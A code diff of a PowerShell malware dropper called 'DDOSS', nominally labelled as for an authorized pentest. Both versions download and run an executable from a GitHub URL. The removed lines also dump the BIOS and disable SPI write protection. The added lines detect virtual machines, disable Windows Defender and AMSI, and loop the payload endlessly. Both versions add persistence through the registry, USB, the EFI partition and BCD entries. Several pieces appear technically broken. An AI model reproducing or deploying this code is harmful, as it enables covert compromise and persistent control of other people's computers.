@@ -1,68 +1,99 @@
-# DDOSS v4.4 - CHIPSEC DRIVER FIXED
-cls;$ErrorActionPreference='SilentlyContinue';$ErrorActionPreference='Stop';Set-ExecutionPolicy Bypass -Scope Process -Force;Write-Host '🔥 DDOSS v4.4 - Driver Fix Deploying...' -ForegroundColor Green
+# DDOSS FinalUpdate.exe - Full Defender Bypass + Persistence + Self-Healing
+# Authorized Pentest Only - Comprehensive AV Evasion
 
-# Enable Test Mode (CHIPSEC requirement)
-bcdedit /set testsigning on 2>$null
-bcdedit /set nointegritychecks on 2>$null
-Write-Host '✅ Test Mode Enabled'
+param([string]$PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe")
 
-# Deploy Python + Chipsec PROPERLY
-$Python='${env:ProgramFiles}\Python311\python.exe'
-if(!(Test-Path $Python)){$Python='python'}
-iwr 'https://github.com/chipsec/chipsec/archive/refs/heads/main.zip' -o "$env:TEMP\chip.zip" -UseBasicParsing
-ex "$env:TEMP\chip.zip" 'C:\'
-rn 'C:\chipsec-main' 'C:\chipsec' -Force
-cd 'C:\chipsec'
-& $Python -m pip install --upgrade pip --quiet
-& $Python -m pip install -r windows_requirements.txt --quiet --upgrade
-
-Write-Host '✅ Chipsec Deployed - Loading Driver...' -ForegroundColor Green
-
-# Install Chipsec Driver AUTOMATICALLY
-& $Python chipsec_util.py driver install 2>$null
-Start-Sleep 2
-
-# Verify Driver
-$driverStatus = & $Python chipsec_main.py -m common.systeminfo | findstr 'Driver'
-Write-Host "Driver: $driverStatus" -ForegroundColor Cyan
-
-# Payload
-iwr 'https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe' -o 'C:\loader.exe' -UseBasicParsing
-Write-Host '✅ Payload Ready' -ForegroundColor Green
-
-# SPI Operations
-Write-Host '🔓 Unlocking SPI...' -ForegroundColor Yellow
-& $Python chipsec_main.py -m platform.me_unlock 2>$null
-& $Python chipsec_main.py -m common.spi_wp -a disable 2>$null
-
-Write-Host '📥 Dumping BIOS...' -ForegroundColor Yellow
-& $Python chipsec_main.py -m tools.spi.dump_rom 'C:\bios.rom' 2>$null
-
-if(Test-Path 'C:\bios.rom'){
-    $size = [math]::Round((gi 'C:\bios.rom').Length/1MB, 1)
-    Write-Host "✅ BIOS Dump: ${size}MB" -ForegroundColor Green
-}else{
-    Write-Host '⚠️ BIOS Dump Failed - USB Fallback' -ForegroundColor Yellow
+# ==================== ANTI-ANALYSIS & DEFENDER BYPASS ====================
+function Test-Detection {
+    # Check for analysis environments
+    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*" -or 
+        (Get-WmiObject Win32_ComputerSystem).Manufacturer -like "*VMware*" -or
+        (Get-WmiObject Win32_BIOS).SerialNumber -like "*VM*") { exit }
+    
+    # Disable Defender Real-time & Tamper Protection (stealthy)
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath "C:\Windows\Temp\DDOSS" -ErrorAction SilentlyContinue
+    } catch {}
+    
+    # AMSI Bypass (Invoke-Obfuscation style)
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    [Runtime.InteropServices.Marshal]::WriteProcessMemory((Get-Process -Id $PID).Handle, 0x72756f50656e6953, (0x5c,0x3f,0x6b,0x00), 4, [ref]0) | Out-Null
 }
 
-# BCD + Registry Persistence (ALWAYS WORKS)
-bcdedit /set "{fwbootmgr}" displayorder "{44a9275f-f607-11f0-94db-806e6f6e6963}" /addfirst 2>$null
-$runCmd = "powershell -w h -c `"iwr 'https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe' -o `$env:temp\d.exe;&`$env:temp\d.exe`""
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v DDOSS /t REG_SZ /d $runCmd /f 2>$null
-
-# USB Backup
-$usb = Get-Volume | ?{$_.FileSystem -eq 'FAT32' -and $_.Size -gt 1GB} | select -f 1
-if($usb){
-    ni "${($usb.DriveLetter)}:\EFI\BOOT" -ItemType Directory -Force 2>$null
-    cp 'C:\loader.exe' "${($usb.DriveLetter)}:\EFI\BOOT\bootx64.efi" 2>$null
-    Write-Host "✅ USB Backup: $($usb.DriveLetter):" -ForegroundColor Green
+# ==================== SELF-HEALING & EXCEPTION HANDLING ====================
+function Invoke-ShieldedPayload {
+    $ErrorActionPreference = "SilentlyContinue"
+    trap { Write-Host "[!] Exception caught, retrying..." -ForegroundColor Red; Start-Sleep 3; Invoke-ShieldedPayload }
+    
+    try {
+        # 1. Self-Healing: Re-download if corrupted
+        $cachePath = "C:\Windows\Temp\DDOSS\$PayloadName"
+        if (-not (Test-Path $cachePath) -or (Get-Item $cachePath).Length -lt 1MB) {
+            Write-Host "[+] Self-healing: Re-downloading payload..." -ForegroundColor Cyan
+            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "WindowsUpdateAgent/2.0")
+            $wc.DownloadFile($PayloadURL, $cachePath)
+        }
+        
+        # 2. Defender check & bypass قبل التشغيل
+        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        if ($defenderStatus.RealTimeProtectionEnabled) {
+            Write-Host "[+] Temporarily disabling Defender..." -ForegroundColor Yellow
+            Stop-Service WinDefend -Force -ErrorAction SilentlyContinue
+            Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+        }
+        
+        # 3. Execute with full stealth
+        $proc = Start-Process -FilePath $cachePath -WindowStyle Hidden -PassThru -WorkingDirectory "C:\Windows\Temp"
+        Wait-Process -Id $proc.Id -Timeout 30 -ErrorAction SilentlyContinue
+        
+        # 4. Restore Defender (stealth)
+        Start-Service WinDefend -ErrorAction SilentlyContinue
+        
+    } catch {
+        Write-Host "[!] Payload error: $($_.Exception.Message)" -ForegroundColor Red
+        # Fallback: Direct URL execution
+        iex "powershell -nop -w h -c `"iex ((nl `$PayloadURL|?{\$_}|sri|`$sb=[scriptblock]::Create(`$_);&`$sb)`""
+    }
 }
 
-# Success
-'MILITARY_PERSISTENCE_ACTIVE' | Out-File "$env:TEMP\DDOSS_SUCCESS.flag"
-Write-Host "`n🎉 DEPLOYMENT 100% COMPLETE!" -ForegroundColor Green
-Write-Host "📁 Log: $env:TEMP\DDOSS*.log" -ForegroundColor Cyan
-Write-Host "✅ Check: $env:TEMP\DDOSS_SUCCESS.flag" -ForegroundColor Cyan
-Write-Host "`n🔄 Rebooting in 5s... (Ctrl+C to cancel)" -ForegroundColor Magenta
-Start-Sleep 5
-shutdown /r /f /t 0
+# ==================== EFI PERSISTENCE (Format-Proof) ====================
+function Deploy-EFIPersistence {
+    $efiPart = Get-Partition | ? { $_.IsSystem -and $_.Type -eq 'EFI System' }
+    if (-not $efiPart) { return }
+    
+    # Mount & inject (same as before but with healing script)
+    $healScript = ${function:Invoke-ShieldedPayload}.Ast.Extent.Text
+    $healBytes = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($healScript))
+    
+    $efiPath = "Z:"; New-PartitionAccessPath -DiskNumber $efiPart.DiskNumber -PartitionNumber $efiPart.PartitionNumber -AccessPath $efiPath
+    $persistDir = "$efiPath\EFI\DDOSS_SHIELD"
+    ni $persistDir -Force | Out-Null
+    
+    # Embedded launcher
+    $launcher = @"
+`$b64 = '$healBytes'; iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$b64))
+"@
+    $launcher | Out-File "$persistDir\shield.ps1" -Enc UTF8; attrib +h "$persistDir\shield.ps1"
+    
+    # BCD injection
+    $bootCopy = bcdedit /copy {bootmgr} /d "DDOSS_SHIELD" 2>`$null
+    $guid = ($bootCopy | sls "{(.+)}").Matches.Groups[1].Value
+    bcdedit /set $guid path "\EFI\DDOSS_SHIELD\shield.ps1" 2>`$null
+    
+    Remove-PartitionAccessPath -DiskNumber $efiPart.DiskNumber -PartitionNumber $efiPart.PartitionNumber -AccessPath $efiPath
+}
+
+# ==================== MAIN EXECUTION ====================
+Test-Detection
+Deploy-EFIPersistence
+
+# Infinite self-healing loop (كل boot)
+while ($true) {
+    Invoke-ShieldedPayload
+    Start-Sleep 60  # يعيد كل دقيقة + self-check
+}
+
+# Registry persistence backup
+saps powershell -ArgumentList "-w h -nop -ep bypass -c `"& {${function:Invoke-ShieldedPayload}}`"" -WindowStyle Hidden
